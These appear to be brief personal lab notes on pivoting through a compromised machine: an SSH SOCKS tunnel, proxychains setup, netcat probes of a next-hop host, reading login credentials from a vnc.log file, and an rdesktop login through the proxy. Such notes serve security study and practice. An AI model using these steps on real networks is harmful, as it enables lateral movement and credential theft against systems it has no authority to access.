### 02092023Sat

```
ssh -D 8090 user@IP
```

```
username and machine IP must be already compromised.
```

```
nano /etc/proxychains.conf
```

*Modifying the following **socks4** under the [ProxyList] of proxychains.conf file.*

```
socks4 127.0.0.1 8090
```

```
proxychains nc -nv compromised'sIP 80
```

```
proxychains nc -nv next-hop'sIP 445
```

*we got login credentials from vnc.log file of compromised machine.*

```
cat vnc.log
```

*Then rdesktop*

```
proxychains rdesktop next-hop'sIP
```
